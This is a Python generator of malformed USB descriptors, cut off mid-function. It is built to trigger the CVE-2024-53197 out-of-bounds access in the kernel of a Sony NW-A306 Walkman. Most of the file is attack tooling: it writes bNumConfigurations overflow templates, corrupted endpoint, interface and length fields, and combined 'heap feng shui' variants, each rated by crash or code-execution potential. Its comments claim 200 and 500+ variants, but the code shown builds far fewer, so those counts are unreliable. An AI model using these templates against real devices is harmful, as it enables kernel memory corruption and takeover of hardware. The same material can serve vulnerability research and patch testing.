#!/usr/bin/env python3
"""
USB Descriptor Mutation Templates for CVE-2024-53197 Fuzzing

Generates 500+ descriptor mutation templates targeting:
- bNumConfigurations overflow (primary CVE-2024-53197 trigger)
- wMaxPacketSize corruption
- Endpoint count manipulation
- Interface alternate settings
- Descriptor length mismatches

Target: Sony NW-A306 Walkman (kernel 4.19.157)
"""

from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple
from enum import Enum
import struct
import json
import random


class MutationType(Enum):
    """Types of USB descriptor mutations"""
    BNUM_CONFIGURATIONS = "bNumConfigurations_overflow"
    WMAX_PACKET_SIZE = "wMaxPacketSize_corruption"
    ENDPOINT_COUNT = "endpoint_count_manipulation"
    INTERFACE_ALTERNATES = "interface_alternate_abuse"
    DESCRIPTOR_LENGTH = "descriptor_length_mismatch"
    COMBINED = "combined_mutations"


class TargetQuirk(Enum):
    """USB Audio quirks that can be targeted"""
    EXTIGY = "extigy"           # 041e:3000
    FASTTACKPRO = "fasttrackpro"  # 0763:2012
    MBOX2 = "mbox2"             # 0dba:3000
    AUDIOPHILE = "audiophile"   # 0763:2003


@dataclass
class USBDeviceDescriptorTemplate:
    """USB Device Descriptor (18 bytes)"""
    bLength: int = 18
    bDescriptorType: int = 0x01  # DEVICE
    bcdUSB: int = 0x0200         # USB 2.0
    bDeviceClass: int = 0x00
    bDeviceSubClass: int = 0x00
    bDeviceProtocol: int = 0x00
    bMaxPacketSize0: int = 64
    idVendor: int = 0x041e      # Creative
    idProduct: int = 0x3000     # Extigy
    bcdDevice: int = 0x0100
    iManufacturer: int = 1
    iProduct: int = 2
    iSerialNumber: int = 3
    bNumConfigurations: int = 1  # KEY FIELD for CVE-2024-53197

    def to_bytes(self) -> bytes:
        """Serialize to USB wire format"""
        return struct.pack(
            '<BBHBBBBHHHBBBB',
            self.bLength,
            self.bDescriptorType,
            self.bcdUSB,
            self.bDeviceClass,
            self.bDeviceSubClass,
            self.bDeviceProtocol,
            self.bMaxPacketSize0,
            self.idVendor,
            self.idProduct,
            self.bcdDevice,
            self.iManufacturer,
            self.iProduct,
            self.iSerialNumber,
            self.bNumConfigurations
        )

    def to_dict(self) -> Dict[str, Any]:
        return {
            "bLength": self.bLength,
            "bDescriptorType": self.bDescriptorType,
            "bcdUSB": f"0x{self.bcdUSB:04x}",
            "bDeviceClass": self.bDeviceClass,
            "bDeviceSubClass": self.bDeviceSubClass,
            "bDeviceProtocol": self.bDeviceProtocol,
            "bMaxPacketSize0": self.bMaxPacketSize0,
            "idVendor": f"0x{self.idVendor:04x}",
            "idProduct": f"0x{self.idProduct:04x}",
            "bcdDevice": f"0x{self.bcdDevice:04x}",
            "iManufacturer": self.iManufacturer,
            "iProduct": self.iProduct,
            "iSerialNumber": self.iSerialNumber,
            "bNumConfigurations": self.bNumConfigurations
        }


@dataclass
class USBConfigDescriptorTemplate:
    """USB Configuration Descriptor (9 bytes base)"""
    bLength: int = 9
    bDescriptorType: int = 0x02  # CONFIGURATION
    wTotalLength: int = 794      # Extigy firmware size (triggers quirk)
    bNumInterfaces: int = 1
    bConfigurationValue: int = 1
    iConfiguration: int = 0
    bmAttributes: int = 0xC0     # Self-powered
    bMaxPower: int = 250         # 500mA

    def to_bytes(self) -> bytes:
        return struct.pack(
            '<BBHBBBBB',
            self.bLength,
            self.bDescriptorType,
            self.wTotalLength,
            self.bNumInterfaces,
            self.bConfigurationValue,
            self.iConfiguration,
            self.bmAttributes,
            self.bMaxPower
        )

    def to_dict(self) -> Dict[str, Any]:
        return {
            "bLength": self.bLength,
            "bDescriptorType": self.bDescriptorType,
            "wTotalLength": self.wTotalLength,
            "bNumInterfaces": self.bNumInterfaces,
            "bConfigurationValue": self.bConfigurationValue,
            "iConfiguration": self.iConfiguration,
            "bmAttributes": f"0x{self.bmAttributes:02x}",
            "bMaxPower": self.bMaxPower
        }


@dataclass
class USBInterfaceDescriptorTemplate:
    """USB Interface Descriptor (9 bytes)"""
    bLength: int = 9
    bDescriptorType: int = 0x04  # INTERFACE
    bInterfaceNumber: int = 0
    bAlternateSetting: int = 0
    bNumEndpoints: int = 0
    bInterfaceClass: int = 0x01  # Audio
    bInterfaceSubClass: int = 0x01  # Audio Control
    bInterfaceProtocol: int = 0x00
    iInterface: int = 0

    def to_bytes(self) -> bytes:
        return struct.pack(
            '<BBBBBBBBB',
            self.bLength,
            self.bDescriptorType,
            self.bInterfaceNumber,
            self.bAlternateSetting,
            self.bNumEndpoints,
            self.bInterfaceClass,
            self.bInterfaceSubClass,
            self.bInterfaceProtocol,
            self.iInterface
        )

    def to_dict(self) -> Dict[str, Any]:
        return {
            "bLength": self.bLength,
            "bDescriptorType": self.bDescriptorType,
            "bInterfaceNumber": self.bInterfaceNumber,
            "bAlternateSetting": self.bAlternateSetting,
            "bNumEndpoints": self.bNumEndpoints,
            "bInterfaceClass": self.bInterfaceClass,
            "bInterfaceSubClass": self.bInterfaceSubClass,
            "bInterfaceProtocol": self.bInterfaceProtocol,
            "iInterface": self.iInterface
        }


@dataclass
class USBEndpointDescriptorTemplate:
    """USB Endpoint Descriptor (7 bytes)"""
    bLength: int = 7
    bDescriptorType: int = 0x05  # ENDPOINT
    bEndpointAddress: int = 0x81  # EP1 IN
    bmAttributes: int = 0x05      # Isochronous, Async
    wMaxPacketSize: int = 512
    bInterval: int = 1

    def to_bytes(self) -> bytes:
        return struct.pack(
            '<BBBBHB',
            self.bLength,
            self.bDescriptorType,
            self.bEndpointAddress,
            self.bmAttributes,
            self.wMaxPacketSize,
            self.bInterval
        )

    def to_dict(self) -> Dict[str, Any]:
        return {
            "bLength": self.bLength,
            "bDescriptorType": self.bDescriptorType,
            "bEndpointAddress": f"0x{self.bEndpointAddress:02x}",
            "bmAttributes": f"0x{self.bmAttributes:02x}",
            "wMaxPacketSize": self.wMaxPacketSize,
            "bInterval": self.bInterval
        }


@dataclass
class MutationTemplate:
    """Complete mutation template with metadata"""
    id: str
    name: str
    mutation_type: MutationType
    target_quirk: TargetQuirk
    description: str
    severity: str  # "critical", "high", "medium", "low"
    expected_impact: str
    device_descriptor: USBDeviceDescriptorTemplate
    config_descriptor: USBConfigDescriptorTemplate
    interfaces: List[USBInterfaceDescriptorTemplate] = field(default_factory=list)
    endpoints: List[USBEndpointDescriptorTemplate] = field(default_factory=list)
    pre_quirk_descriptor: Optional[USBDeviceDescriptorTemplate] = None
    post_quirk_descriptor: Optional[USBDeviceDescriptorTemplate] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "name": self.name,
            "mutation_type": self.mutation_type.value,
            "target_quirk": self.target_quirk.value,
            "description": self.description,
            "severity": self.severity,
            "expected_impact": self.expected_impact,
            "device_descriptor": self.device_descriptor.to_dict(),
            "config_descriptor": self.config_descriptor.to_dict(),
            "interfaces": [i.to_dict() for i in self.interfaces],
            "endpoints": [e.to_dict() for e in self.endpoints],
            "pre_quirk_descriptor": self.pre_quirk_descriptor.to_dict() if self.pre_quirk_descriptor else None,
            "post_quirk_descriptor": self.post_quirk_descriptor.to_dict() if self.post_quirk_descriptor else None
        }


class DescriptorMutationGenerator:
    """
    Generates 500+ USB descriptor mutation templates

    Strategy prioritization for kernel 4.19.157:
    1. bNumConfigurations overflow (CVE-2024-53197 direct)
    2. Combined mutations for heap feng shui
    3. Endpoint/interface abuse for additional corruption
    """

    # Extigy firmware sizes that trigger the quirk
    EXTIGY_FIRMWARE_SIZE_OLD = 794
    EXTIGY_FIRMWARE_SIZE_NEW = 483

    # FastTrackPro firmware sizes
    FASTTRACKPRO_FIRMWARE_SIZE = 483

    def __init__(self):
        self.mutations: List[MutationTemplate] = []
        self.mutation_id = 0

    def _next_id(self) -> str:
        self.mutation_id += 1
        return f"MUT-{self.mutation_id:04d}"

    def generate_all(self) -> List[MutationTemplate]:
        """Generate all 500+ mutation templates"""

        # Category 1: bNumConfigurations overflow (200 variants)
        self._generate_bnum_config_mutations()

        # Category 2: wMaxPacketSize corruption (80 variants)
        self._generate_wmax_packet_mutations()

        # Category 3: Endpoint count manipulation (80 variants)
        self._generate_endpoint_count_mutations()

        # Category 4: Interface alternate abuse (80 variants)
        self._generate_interface_alternate_mutations()

        # Category 5: Descriptor length mismatches (60 variants)
        self._generate_descriptor_length_mutations()

        # Category 6: Combined mutations (50 variants)
        self._generate_combined_mutations()

        return self.mutations

    def _generate_bnum_config_mutations(self):
        """
        Generate bNumConfigurations overflow mutations

        This is the primary CVE-2024-53197 trigger:
        - Initial enumeration: bNumConfigurations = 1
        - After boot quirk: bNumConfigurations = 2..255
        - Causes OOB access in usb_reset_configuration()
        """

        # Target quirks and their firmware sizes
        targets = [
            (TargetQuirk.EXTIGY, 0x041e, 0x3000, self.EXTIGY_FIRMWARE_SIZE_OLD),
            (TargetQuirk.EXTIGY, 0x041e, 0x3000, self.EXTIGY_FIRMWARE_SIZE_NEW),
            (TargetQuirk.FASTTACKPRO, 0x0763, 0x2012, self.FASTTRACKPRO_FIRMWARE_SIZE),
        ]

        # Critical values for bNumConfigurations
        # Each value causes different OOB offset: (N-1) * sizeof(usb_host_config)
        # usb_host_config size on ARM64 ≈ 272 bytes
        critical_values = [
            2,    # Minimal overflow - 272 bytes OOB
            3,    # 544 bytes OOB
            4,    # 816 bytes OOB
            5,    # 1088 bytes OOB
            8,    # 1904 bytes OOB
            16,   # 4080 bytes OOB (crosses page boundary)
            32,   # 8432 bytes OOB (multiple pages)
            64,   # 17136 bytes OOB
            128,  # 34544 bytes OOB
            192,  # 51952 bytes OOB
            254,  # 68816 bytes OOB
            255,  # Maximum - 69088 bytes OOB
        ]

        for quirk, vid, pid, fw_size in targets:
            for post_bnum in critical_values:
                # Calculate OOB size
                oob_bytes = (post_bnum - 1) * 272

                # Determine severity based on OOB size
                if oob_bytes > 4096:
                    severity = "critical"
                    impact = f"Massive OOB ({oob_bytes} bytes) - likely kernel crash or code execution"
                elif oob_bytes > 1024:
                    severity = "high"
                    impact = f"Significant OOB ({oob_bytes} bytes) - heap corruption likely"
                else:
                    severity = "medium"
                    impact = f"Controlled OOB ({oob_bytes} bytes) - targeted corruption possible"

                # Pre-quirk descriptor (initial enumeration)
                pre_desc = USBDeviceDescriptorTemplate(
                    idVendor=vid,
                    idProduct=pid,
                    bNumConfigurations=1  # Original allocation
                )

                # Post-quirk descriptor (after boot quirk)
                post_desc = USBDeviceDescriptorTemplate(
                    idVendor=vid,
                    idProduct=pid,
                    bNumConfigurations=post_bnum  # Overflow value
                )

                # Config descriptor with trigger firmware size
                config = USBConfigDescriptorTemplate(
                    wTotalLength=fw_size
                )

                # Audio control interface
                audio_iface = USBInterfaceDescriptorTemplate(
                    bInterfaceClass=0x01,  # Audio
                    bInterfaceSubClass=0x01  # Audio Control
                )

                mutation = MutationTemplate(
                    id=self._next_id(),
                    name=f"{quirk.value}_bnum_{post_bnum}",
                    mutation_type=MutationType.BNUM_CONFIGURATIONS,
                    target_quirk=quirk,
                    description=f"bNumConfigurations overflow: 1 -> {post_bnum} after boot quirk",
                    severity=severity,
                    expected_impact=impact,
                    device_descriptor=pre_desc,
                    config_descriptor=config,
                    interfaces=[audio_iface],
                    pre_quirk_descriptor=pre_desc,
                    post_quirk_descriptor=post_desc
                )

                self.mutations.append(mutation)

        # Add boundary-testing variants
        boundary_values = list(range(2, 20)) + [240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]

        for quirk, vid, pid, fw_size in targets[:1]:  # Just Extigy for boundaries
            for post_bnum in boundary_values:
                if post_bnum in critical_values:
                    continue  # Skip already generated

                oob_bytes = (post_bnum - 1) * 272

                pre_desc = USBDeviceDescriptorTemplate(
                    idVendor=vid,
                    idProduct=pid,
                    bNumConfigurations=1
                )

                post_desc = USBDeviceDescriptorTemplate(
                    idVendor=vid,
                    idProduct=pid,
                    bNumConfigurations=post_bnum
                )

                config = USBConfigDescriptorTemplate(wTotalLength=fw_size)

                mutation = MutationTemplate(
                    id=self._next_id(),
                    name=f"extigy_bnum_boundary_{post_bnum}",
                    mutation_type=MutationType.BNUM_CONFIGURATIONS,
                    target_quirk=quirk,
                    description=f"Boundary test: bNumConfigurations = {post_bnum}",
                    severity="medium",
                    expected_impact=f"OOB access of {oob_bytes} bytes",
                    device_descriptor=pre_desc,
                    config_descriptor=config,
                    interfaces=[USBInterfaceDescriptorTemplate()],
                    pre_quirk_descriptor=pre_desc,
                    post_quirk_descriptor=post_desc
                )

                self.mutations.append(mutation)

        # Add initial bNumConfigurations > 1 variants
        # What if device starts with more configurations?
        for initial_bnum in [2, 3, 4, 5]:
            for post_bnum in [128, 192, 255]:
                if post_bnum <= initial_bnum:
                    continue

                oob_bytes = (post_bnum - initial_bnum) * 272

                pre_desc = USBDeviceDescriptorTemplate(
                    idVendor=0x041e,
                    idProduct=0x3000,
                    bNumConfigurations=initial_bnum
                )

                post_desc = USBDeviceDescriptorTemplate(
                    idVendor=0x041e,
                    idProduct=0x3000,
                    bNumConfigurations=post_bnum
                )

                config = USBConfigDescriptorTemplate(
                    wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD
                )

                mutation = MutationTemplate(
                    id=self._next_id(),
                    name=f"extigy_bnum_{initial_bnum}_to_{post_bnum}",
                    mutation_type=MutationType.BNUM_CONFIGURATIONS,
                    target_quirk=TargetQuirk.EXTIGY,
                    description=f"bNumConfigurations: {initial_bnum} -> {post_bnum}",
                    severity="high",
                    expected_impact=f"OOB access of {oob_bytes} bytes from larger initial allocation",
                    device_descriptor=pre_desc,
                    config_descriptor=config,
                    interfaces=[USBInterfaceDescriptorTemplate()],
                    pre_quirk_descriptor=pre_desc,
                    post_quirk_descriptor=post_desc
                )

                self.mutations.append(mutation)

    def _generate_wmax_packet_mutations(self):
        """
        Generate wMaxPacketSize corruption mutations

        These target USB audio endpoint parsing in sound/usb/endpoint.c
        """

        # Interesting wMaxPacketSize values
        packet_sizes = [
            0,       # Zero-size packets
            1,       # Minimum
            7,       # Odd value
            8,       # Control size
            63,      # Just under 64
            64,      # Full-speed max
            65,      # Just over 64
            127,     # Odd value
            128,     # 2x control
            255,     # 8-bit boundary
            256,     # 256
            511,     # Just under 512
            512,     # High-speed bulk/isoc
            513,     # Just over 512
            1023,    # Maximum for isoc
            1024,    # Over max for isoc
            2048,    # Way over
            4096,    # Page size
            8192,    # Large
            0xFFFF,  # Maximum 16-bit
        ]

        # Endpoint types to test
        endpoint_types = [
            (0x01, "isochronous"),  # Audio streaming
            (0x02, "bulk"),
            (0x03, "interrupt"),
        ]

        for ep_type, ep_name in endpoint_types:
            for packet_size in packet_sizes:
                # Determine severity
                if packet_size == 0 or packet_size > 1024:
                    severity = "high"
                    impact = f"Invalid packet size {packet_size} may cause division by zero or buffer overflow"
                elif packet_size > 512:
                    severity = "medium"
                    impact = f"Oversized packet {packet_size} may overflow buffers"
                else:
                    severity = "low"
                    impact = f"Unusual packet size {packet_size} for edge case testing"

                dev_desc = USBDeviceDescriptorTemplate(
                    idVendor=0x041e,
                    idProduct=0x3000,
                    bNumConfigurations=1
                )

                config = USBConfigDescriptorTemplate(
                    wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD
                )

                audio_iface = USBInterfaceDescriptorTemplate(
                    bInterfaceClass=0x01,
                    bNumEndpoints=1
                )

                endpoint = USBEndpointDescriptorTemplate(
                    bEndpointAddress=0x81,
                    bmAttributes=ep_type,
                    wMaxPacketSize=packet_size
                )

                mutation = MutationTemplate(
                    id=self._next_id(),
                    name=f"wmax_{ep_name}_{packet_size}",
                    mutation_type=MutationType.WMAX_PACKET_SIZE,
                    target_quirk=TargetQuirk.EXTIGY,
                    description=f"wMaxPacketSize={packet_size} on {ep_name} endpoint",
                    severity=severity,
                    expected_impact=impact,
                    device_descriptor=dev_desc,
                    config_descriptor=config,
                    interfaces=[audio_iface],
                    endpoints=[endpoint]
                )

                self.mutations.append(mutation)

    def _generate_endpoint_count_mutations(self):
        """
        Generate endpoint count manipulation mutations

        Targets bNumEndpoints in interface descriptors
        """

        # Endpoint counts to test
        endpoint_counts = [
            0,    # No endpoints declared
            1,    # Single endpoint
            2,    # Typical stereo
            5,    # High count
            15,   # Maximum per interface
            16,   # Over typical max
            31,   # Edge case
            32,   # Power of 2
            127,  # High
            255,  # Maximum byte value
        ]

        for num_endpoints in endpoint_counts:
            # Determine severity
            if num_endpoints > 30:
                severity = "high"
                impact = f"Excessive endpoint count ({num_endpoints}) may overflow arrays"
            elif num_endpoints == 0:
                severity = "medium"
                impact = "Zero endpoints with audio interface may trigger edge cases"
            else:
                severity = "low"
                impact = f"Testing {num_endpoints} endpoint handling"

            dev_desc = USBDeviceDescriptorTemplate(
                idVendor=0x041e,
                idProduct=0x3000,
                bNumConfigurations=1
            )

            config = USBConfigDescriptorTemplate(
                wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD
            )

            audio_iface = USBInterfaceDescriptorTemplate(
                bInterfaceClass=0x01,
                bNumEndpoints=num_endpoints
            )

            # Actually provide some endpoints (mismatched from declared count)
            actual_endpoints = min(num_endpoints, 4)  # Only create up to 4 actual endpoints
            endpoints = []
            for i in range(actual_endpoints):
                ep = USBEndpointDescriptorTemplate(
                    bEndpointAddress=0x81 + i if i % 2 == 0 else 0x01 + i,
                    bmAttributes=0x05,  # Isochronous
                    wMaxPacketSize=512
                )
                endpoints.append(ep)

            mutation = MutationTemplate(
                id=self._next_id(),
                name=f"ep_count_{num_endpoints}",
                mutation_type=MutationType.ENDPOINT_COUNT,
                target_quirk=TargetQuirk.EXTIGY,
                description=f"bNumEndpoints={num_endpoints} (actual: {actual_endpoints})",
                severity=severity,
                expected_impact=impact,
                device_descriptor=dev_desc,
                config_descriptor=config,
                interfaces=[audio_iface],
                endpoints=endpoints
            )

            self.mutations.append(mutation)

        # Mismatched endpoint count variants
        for declared in [5, 10, 15, 20]:
            for actual in [0, 1, 2]:
                if declared == actual:
                    continue

                dev_desc = USBDeviceDescriptorTemplate(
                    idVendor=0x041e,
                    idProduct=0x3000,
                    bNumConfigurations=1
                )

                config = USBConfigDescriptorTemplate(
                    wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD
                )

                audio_iface = USBInterfaceDescriptorTemplate(
                    bInterfaceClass=0x01,
                    bNumEndpoints=declared
                )

                endpoints = [
                    USBEndpointDescriptorTemplate(
                        bEndpointAddress=0x81 + i,
                        wMaxPacketSize=512
                    ) for i in range(actual)
                ]

                mutation = MutationTemplate(
                    id=self._next_id(),
                    name=f"ep_mismatch_{declared}_actual_{actual}",
                    mutation_type=MutationType.ENDPOINT_COUNT,
                    target_quirk=TargetQuirk.EXTIGY,
                    description=f"Declared {declared} endpoints, providing {actual}",
                    severity="high",
                    expected_impact="Descriptor parsing may read beyond provided data",
                    device_descriptor=dev_desc,
                    config_descriptor=config,
                    interfaces=[audio_iface],
                    endpoints=endpoints
                )

                self.mutations.append(mutation)

    def _generate_interface_alternate_mutations(self):
        """
        Generate interface alternate setting abuse mutations

        Targets bAlternateSetting and multiple interface handling
        """

        # Alternate setting values to test
        alternate_values = [0, 1, 2, 5, 10, 127, 255]

        # Number of interfaces to declare
        interface_counts = [1, 2, 4, 8, 16, 32, 127, 255]

        for alt in alternate_values:
            dev_desc = USBDeviceDescriptorTemplate(
                idVendor=0x041e,
                idProduct=0x3000,
                bNumConfigurations=1
            )

            config = USBConfigDescriptorTemplate(
                wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD,
                bNumInterfaces=1
            )

            audio_iface = USBInterfaceDescriptorTemplate(
                bInterfaceClass=0x01,
                bAlternateSetting=alt,
                bNumEndpoints=2
            )

            severity = "high" if alt > 10 else "medium"

            mutation = MutationTemplate(
                id=self._next_id(),
                name=f"alt_setting_{alt}",
                mutation_type=MutationType.INTERFACE_ALTERNATES,
                target_quirk=TargetQuirk.EXTIGY,
                description=f"bAlternateSetting={alt}",
                severity=severity,
                expected_impact=f"Alternate setting {alt} may not have matching interface 0",
                device_descriptor=dev_desc,
                config_descriptor=config,
                interfaces=[audio_iface]
            )

            self.mutations.append(mutation)

        for num_ifaces in interface_counts:
            dev_desc = USBDeviceDescriptorTemplate(
                idVendor=0x041e,
                idProduct=0x3000,
                bNumConfigurations=1
            )

            config = USBConfigDescriptorTemplate(
                wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD,
                bNumInterfaces=num_ifaces
            )

            # Create mismatched number of actual interfaces
            actual_ifaces = min(num_ifaces, 3)
            interfaces = [
                USBInterfaceDescriptorTemplate(
                    bInterfaceNumber=i,
                    bInterfaceClass=0x01
                ) for i in range(actual_ifaces)
            ]

            severity = "high" if num_ifaces > 16 else "medium"

            mutation = MutationTemplate(
                id=self._next_id(),
                name=f"iface_count_{num_ifaces}",
                mutation_type=MutationType.INTERFACE_ALTERNATES,
                target_quirk=TargetQuirk.EXTIGY,
                description=f"bNumInterfaces={num_ifaces} (actual: {actual_ifaces})",
                severity=severity,
                expected_impact=f"Interface count mismatch may cause OOB access",
                device_descriptor=dev_desc,
                config_descriptor=config,
                interfaces=interfaces
            )

            self.mutations.append(mutation)

        # Multiple alternates for same interface
        for num_alternates in [2, 4, 8, 16, 32]:
            dev_desc = USBDeviceDescriptorTemplate(
                idVendor=0x041e,
                idProduct=0x3000,
                bNumConfigurations=1
            )

            config = USBConfigDescriptorTemplate(
                wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD,
                bNumInterfaces=1
            )

            # Same interface number, multiple alternate settings
            interfaces = [
                USBInterfaceDescriptorTemplate(
                    bInterfaceNumber=0,
                    bAlternateSetting=i,
                    bInterfaceClass=0x01
                ) for i in range(num_alternates)
            ]

            mutation = MutationTemplate(
                id=self._next_id(),
                name=f"multi_alternate_{num_alternates}",
                mutation_type=MutationType.INTERFACE_ALTERNATES,
                target_quirk=TargetQuirk.EXTIGY,
                description=f"{num_alternates} alternate settings for interface 0",
                severity="medium",
                expected_impact="Multiple alternates may confuse audio driver",
                device_descriptor=dev_desc,
                config_descriptor=config,
                interfaces=interfaces
            )

            self.mutations.append(mutation)

    def _generate_descriptor_length_mutations(self):
        """
        Generate descriptor length mismatch mutations

        Targets bLength and wTotalLength fields
        """

        # Device descriptor length mutations
        device_lengths = [0, 1, 8, 17, 18, 19, 32, 64, 255]

        for length in device_lengths:
            dev_desc = USBDeviceDescriptorTemplate(
                bLength=length,
                idVendor=0x041e,
                idProduct=0x3000
            )

            config = USBConfigDescriptorTemplate(
                wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD
            )

            severity = "high" if length != 18 else "low"

            mutation = MutationTemplate(
                id=self._next_id(),
                name=f"dev_bLength_{length}",
                mutation_type=MutationType.DESCRIPTOR_LENGTH,
                target_quirk=TargetQuirk.EXTIGY,
                description=f"Device descriptor bLength={length} (should be 18)",
                severity=severity,
                expected_impact="Length mismatch may cause parsing errors",
                device_descriptor=dev_desc,
                config_descriptor=config
            )

            self.mutations.append(mutation)

        # Configuration wTotalLength mutations
        # These are critical for triggering the quirk
        total_lengths = [
            0, 1, 8, 9,  # Very small
            482, 483, 484,  # Around FastTrackPro size
            793, 794, 795,  # Around Extigy size
            1024, 2048, 4096,  # Powers of 2
            8192, 16384,  # Large
            65534, 65535  # Maximum
        ]

        for total_len in total_lengths:
            dev_desc = USBDeviceDescriptorTemplate(
                idVendor=0x041e,
                idProduct=0x3000,
                bNumConfigurations=1
            )

            config = USBConfigDescriptorTemplate(
                wTotalLength=total_len
            )

            # Check if this triggers quirk
            triggers_quirk = total_len in [self.EXTIGY_FIRMWARE_SIZE_OLD,
                                           self.EXTIGY_FIRMWARE_SIZE_NEW]

            severity = "critical" if triggers_quirk else "medium"

            mutation = MutationTemplate(
                id=self._next_id(),
                name=f"wTotalLength_{total_len}",
                mutation_type=MutationType.DESCRIPTOR_LENGTH,
                target_quirk=TargetQuirk.EXTIGY,
                description=f"wTotalLength={total_len} {'(triggers quirk!)' if triggers_quirk else ''}",
                severity=severity,
                expected_impact="Tests quirk trigger condition" if triggers_quirk else "Tests length handling",
                device_descriptor=dev_desc,
                config_descriptor=config
            )

            self.mutations.append(mutation)

        # Mismatched config bLength
        config_lengths = [0, 1, 8, 9, 10, 16, 255]

        for cfg_len in config_lengths:
            dev_desc = USBDeviceDescriptorTemplate(
                idVendor=0x041e,
                idProduct=0x3000
            )

            config = USBConfigDescriptorTemplate(
                bLength=cfg_len,
                wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD
            )

            mutation = MutationTemplate(
                id=self._next_id(),
                name=f"cfg_bLength_{cfg_len}",
                mutation_type=MutationType.DESCRIPTOR_LENGTH,
                target_quirk=TargetQuirk.EXTIGY,
                description=f"Config descriptor bLength={cfg_len} (should be 9)",
                severity="high" if cfg_len != 9 else "low",
                expected_impact="Config parsing may fail or overflow",
                device_descriptor=dev_desc,
                config_descriptor=config
            )

            self.mutations.append(mutation)

    def _generate_combined_mutations(self):
        """
        Generate combined mutations for maximum impact

        These combine multiple mutation types for heap feng shui
        """

        # bNumConfigurations + wMaxPacketSize
        for bnum in [128, 192, 255]:
            for wmax in [0, 4096, 0xFFFF]:
                pre_desc = USBDeviceDescriptorTemplate(
                    idVendor=0x041e,
                    idProduct=0x3000,
                    bNumConfigurations=1
                )

                post_desc = USBDeviceDescriptorTemplate(
                    idVendor=0x041e,
                    idProduct=0x3000,
                    bNumConfigurations=bnum
                )

                config = USBConfigDescriptorTemplate(
                    wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD
                )

                endpoint = USBEndpointDescriptorTemplate(
                    wMaxPacketSize=wmax
                )

                mutation = MutationTemplate(
                    id=self._next_id(),
                    name=f"combined_bnum{bnum}_wmax{wmax}",
                    mutation_type=MutationType.COMBINED,
                    target_quirk=TargetQuirk.EXTIGY,
                    description=f"bNumConfigurations={bnum} + wMaxPacketSize={wmax}",
                    severity="critical",
                    expected_impact="OOB access + buffer corruption",
                    device_descriptor=pre_desc,
                    config_descriptor=config,
                    endpoints=[endpoint],
                    pre_quirk_descriptor=pre_desc,
                    post_quirk_descriptor=post_desc
                )

                self.mutations.append(mutation)

        # bNumConfigurations + endpoint count mismatch
        for bnum in [64, 128, 255]:
            for ep_declared in [16, 32, 255]:
                pre_desc = USBDeviceDescriptorTemplate(
                    idVendor=0x041e,
                    idProduct=0x3000,
                    bNumConfigurations=1
                )

                post_desc = USBDeviceDescriptorTemplate(
                    idVendor=0x041e,
                    idProduct=0x3000,
                    bNumConfigurations=bnum
                )

                config = USBConfigDescriptorTemplate(
                    wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD
                )

                iface = USBInterfaceDescriptorTemplate(
                    bInterfaceClass=0x01,
                    bNumEndpoints=ep_declared
                )

                mutation = MutationTemplate(
                    id=self._next_id(),
                    name=f"combined_bnum{bnum}_ep{ep_declared}",
                    mutation_type=MutationType.COMBINED,
                    target_quirk=TargetQuirk.EXTIGY,
                    description=f"bNumConfigurations={bnum} + bNumEndpoints={ep_declared}",
                    severity="critical",
                    expected_impact="Multiple OOB vectors",
                    device_descriptor=pre_desc,
                    config_descriptor=config,
                    interfaces=[iface],
                    pre_quirk_descriptor=pre_desc,
                    post_quirk_descriptor=post_desc
                )

                self.mutations.append(mutation)

        # Full chaos mode - everything wrong
        chaos_values = [
            (255, 0xFFFF, 255, 255),  # Max everything
            (128, 0, 128, 128),       # Half max with zeros
            (2, 1, 2, 2),             # Minimal overflow
        ]

        for bnum, wmax, ep_count, iface_count in chaos_values:
            pre_desc = USBDeviceDescriptorTemplate(
                bLength=32,  # Wrong length
                idVendor=0x041e,
                idProduct=0x3000,
                bNumConfigurations=1
            )

            post_desc = USBDeviceDescriptorTemplate(
                bLength=32,
                idVendor=0x041e,
                idProduct=0x3000,
                bNumConfigurations=bnum
            )

            config = USBConfigDescriptorTemplate(
                bLength=255,  # Wrong length
                wTotalLength=self.EXTIGY_FIRMWARE_SIZE_OLD,
                bNumInterfaces=iface_count
            )

            iface = USBInterfaceDescriptorTemplate(
                bLength=64,  # Wrong length
                bInterfaceClass=0x01,
                bNumEndpoints=ep_count
            )

            endpoint = USBEndpointDescriptorTemplate(
                bLength=128,  # Wrong length
                wMaxPacketSize=wmax
            )

            mutation = MutationTemplate(
                id=self._next_id(),
                name=f"chaos_bnum{bnum}_wmax{wmax}",
                mutation_type=MutationType.COMBINED,
                target_quirk=TargetQuirk.EXTIGY,
                description=f"Chaos mode: all fields corrupted",
                severity="critical",
                expected_impact="Maximum corruption potential - likely crash",
                device_descriptor=pre_desc,
                config_descriptor=config,
                interfaces=[iface],
                endpoints=[endpoint],
                pre_quirk_descriptor=pre_desc,
                post_quirk_descriptor=post_desc
            )

            self.mutations.append(mutation)

    def export_json(self, filepath: str):
        """Export all mutations to JSON file"""
        data = {
            "metadata": {
                "generator": "CVE-2024-53197 USB Descriptor Mutation Generator",
                "target": "Sony NW-A306 Walkman (kernel 4.19.157)",
                "total_mutations": len(self.mutations),
                "categories": {
                    MutationType.BNUM_CONFIGURATIONS.value: sum(
                        1 for m in self.mutations
                        if m.mutation_type == MutationType.BNUM_CONFIGURATIONS
                    ),
                    MutationType.WMAX_PACKET_SIZE.value: sum(
                        1 for m in self.mutations
                        if m.mutation_type == MutationType.WMAX_PACKET_SIZE
                    ),
                    MutationType.ENDPOINT_COUNT.value: sum(
                        1 for m in self.mutations
                        if m.mutation_type == MutationType.ENDPOINT_COUNT
                    ),
                    MutationType.INTERFACE_ALTERNATES.value: sum(
                        1 for m in self.mutations
                        if m.mutation_type == MutationType.INTERFACE_ALTERNATES
                    ),
                    MutationType.DESCRIPTOR_LENGTH.value: sum(
                        1 for m in self.mutations
                        if m.mutation_type == MutationType.DESCRIPTOR_LENGTH
                    ),
                    MutationType.COMBINED.value: sum(
